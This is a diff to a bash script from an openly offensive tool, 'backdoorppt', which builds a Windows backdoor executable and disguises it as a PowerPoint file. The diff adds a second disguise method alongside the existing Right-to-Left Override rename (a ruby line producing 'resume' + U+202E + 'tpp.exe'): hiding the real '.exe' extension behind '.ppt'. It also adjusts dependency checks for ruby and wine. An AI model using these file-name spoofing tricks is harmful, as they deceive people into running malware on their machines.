@@ -8,7 +8,9 @@
 # [ TOOL DESCRIPTION ]
 # This tool Supports wine 32 or 64 bits installations
 # Available with 4 icons to change (backdoorppt/icons)
-#
+# Available 2 diferent name transformations methods (ruby or bash)
+# 1 - Right to Left Override (nameexe.ppt) <-- ruby
+# 2 - Hide Extensions for Known File Types (name.ppt.exe) <-- bash
 ###
 
 
@@ -79,16 +81,20 @@ sleep 1
 # ----------------------
 # check for dependencies
 # ----------------------
+if [ "$tRan" = "YES" ]; then
+echo "running default transformation method" > /dev/null 2>&1
+else
 apc=`which ruby`
 if [ "$?" != "0" ]; then
 echo ""
-echo ${RedF}[☠]${white} Ruby installation '->' ${RedF}not found! ${Reset};
+echo ${RedF}[☠]${white} Ruby interpreter '->' ${RedF}not found! ${Reset};
 echo ${RedF}[☠]${white} This script requires ruby to work! ${Reset};
 sleep 1
 exit
 else
 echo ${BlueF}[☆]${white} Ruby installation  '->' ${GreenF}found! ${Reset};
 sleep 1
+fi
 fi
 
 apc=`which wine`
@@ -110,6 +116,7 @@ echo ${BlueF}[☆]${white} Wine ProgramFiles '->' ${GreenF}found! ${Reset};
 sleep 1
 else
 echo ${RedF}[☠]${white} Wine ProgramFiles '->' ${RedF}not found! ${Reset};
+echo ${RedF}[☠]${white} $HoME/.wine/drive_c/$PgFi ${Reset};
 sleep 1
 echo ${RedF}[☠]${white} Please wait, running winecfg! ${Reset};
 winecfg > /dev/null 2>&1
@@ -187,7 +194,7 @@ cat << !
   # rename backdoor name
   echo ${BlueF}[☆]${white} Word doc builder '(backdoorppt)' '->' ${GreenF}done... ${Reset};
   if [ "$tRan" = "YES" ]; then
-    echo "default build" > /dev/null 2>&1
+    echo "bash build" > /dev/null 2>&1
   else
     ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
   fi
